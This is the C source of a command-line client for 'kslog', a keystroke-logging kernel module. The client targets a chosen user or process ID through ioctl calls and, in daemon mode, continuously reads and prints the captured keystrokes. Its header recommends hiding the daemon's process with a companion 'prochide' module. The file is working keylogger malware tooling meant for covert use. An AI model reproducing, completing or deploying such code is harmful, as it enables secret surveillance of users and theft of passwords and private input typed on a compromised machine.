/*
 * kslog_cli.c
 *
 * kslog keystroke logging LKM command line client. supports
 * settings of logging options and execution as log daemon.
 * in log daemon mode, process can be hidden using prochide
 * LKM package availabel from http://gravitino.net/~mike/.
 *
 * mike@gravitino.net
 */
 
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioccom.h>
 
#include "kslog.h" 
 
#define CMD_SETUID 0x01
#define CMD_SETPID 0x02
#define CMD_START  0x04
#define CMD_STOP   0x08
#define CMD_STATUS 0x10
#define CMD_LOG	   0x20
#define CMD_DAEMON 0x40

#define DEVICE "/dev/kslog"

#define BUF_SIZE 100

#define NEWLINE  "\n"

#define BANNER "*************************************************\n"		\
       	       "* kslog v0.1 - mike@gravitino.net\n"				\
       	       "*************************************************\n"

#define USAGE  "*\n* USAGE:\n"							\
	       "*\n"								\
	       "* -u UID     set user id to log.\n"				\
	       "* -p PID     set process id to log.\n"				\
	       "* -s         start logging.\n"					\
	       "* -q         quit logging.\n"					\
	       "* -g         get status.\n"					\
	       "* -d         run as daemon and log to file.\n"			\
	       "*\n"								\
	       "*************************************************\n"		

#define FAILED_TO_OPEN "failed to open device.\n"

#define ISSET(i, f) i & f
#define SET(c, f) c ^= f
 
void usage ()
{
	write(2, USAGE, strlen(USAGE));
} 

//
// check for proper combination of commands
//
int validate_cmd(int cmd)
{
	// no cl options
	if(cmd == 0)
	{
		return(-1);
	}

	// mutually exclusive
	if(ISSET(cmd, CMD_SETPID) &&
	   ISSET(cmd, CMD_SETUID))
	{
		return(-1);
	}
	
	if(ISSET(cmd, CMD_START)  &&
	   ISSET(cmd, CMD_STOP ))
	{
		return(-1);
	}
	
	if(ISSET(cmd, CMD_STOP )  &&
	   ISSET(cmd, CMD_DAEMON))
	{
		return(-1);
	}
	
	return(0);
}
 
int main(int argc, char *argv[])
{
	struct kslog_op op;
	char ch    = 0;
	int  cmd   = 0;
	int  Xid   = 0;
	int  fd    = 0;
	char *p_id = NULL;
	int  len   = 0;
	char buf[BUF_SIZE];
	int  x     = 0;

	write(2, BANNER, strlen(BANNER));
	       
	opterr = 0;
	       
	/*
	 * parse command line args..
	 */
	while((ch = getopt(argc, argv, "u:p:o:dsqg")) != -1)
	{
		switch(ch)
		{
			case 'u':
			
				p_id = optarg;
				SET(cmd, CMD_SETUID);
				break;
				
			case 'p':
			
				p_id = optarg;
				SET(cmd, CMD_SETPID);
				break;
				
			case 's':
			
				SET(cmd, CMD_START );	
				break;
				
			case 'q':
			
				SET(cmd, CMD_STOP  );
				break;
				
			case 'g':
			
				SET(cmd, CMD_STATUS);
				break;
				
			case 'd':

				SET(cmd, CMD_DAEMON);
				break;

			case '?':
				usage();
				return(1);
		}
	}
	
	// make sure commands are not mutually exclusive
	if(validate_cmd(cmd) != 0)
	{
		usage();
		return(1);
	}
	
	// open char device
	if((fd = open(DEVICE, O_RDONLY)) == -1)
	{
		perror(FAILED_TO_OPEN);
		return(1);
	}

	if(ISSET(cmd, CMD_SETPID) ||
	   ISSET(cmd, CMD_SETUID))
	{
		Xid = atoi(p_id);
	}

	if(ISSET(cmd, CMD_SETPID))
	{
		op.val = Xid;
		if(ioctl(fd, KSLOG_SETPID, &op) == -1)
		{
			close(fd);
			perror("setpid ioctl failed.\n");
			return(1);
		}
		
		printf("pid %d set\n", Xid);
	}
	
	if(ISSET(cmd, CMD_SETUID))
	{
		op.val = Xid;
		if(ioctl(fd, KSLOG_SETUID, &op) == -1)
		{
			close(fd);
			perror("setuid ioctl failed.\n");
			return(1);
		}
		
		printf("uid %d set\n", Xid);
	}
	
	if(ISSET(cmd, CMD_STATUS))
	{
		op.val = 0;
		if(ioctl(fd, KSLOG_STATUS, &op) == -1)
		{
			close(fd);
			perror("status ioctl failed.\n");
			return(1);
		}
		
		printf("kslog is: %s\n", (op.val == 0 ? "off" : "on"));
	}	
	
	if(ISSET(cmd, CMD_START))
	{
		if(ioctl(fd, KSLOG_START, &op) == -1)
		{
			close(fd);
			perror("start ioctl failed.\n");
			return(1);
		}
		
		printf("started\n");
	}
	
	if(ISSET(cmd, CMD_STOP))
	{
		if(ioctl(fd, KSLOG_STOP, &op) == -1)
		{
			close(fd);
			perror("stop ioctl failed.\n");
			return(1);
		}
		
		printf("stopped\n");
	}

	if(ISSET(cmd, CMD_DAEMON))
	{
		while(1)
		{
			len = read(fd, buf, BUF_SIZE);
			if(len > 0)
			{
				for(x=0; x < len; ++x)
				{
					ch = buf[x];
					
					if(ch == '\n' ||
					   (ch > 31 && ch <= 'z'))
					{
						printf("%c", ch);
						fflush((FILE *)0);
					}
				}
			}

			sleep(1);
		}
	}
	
	close(fd);

	return(0);
}

















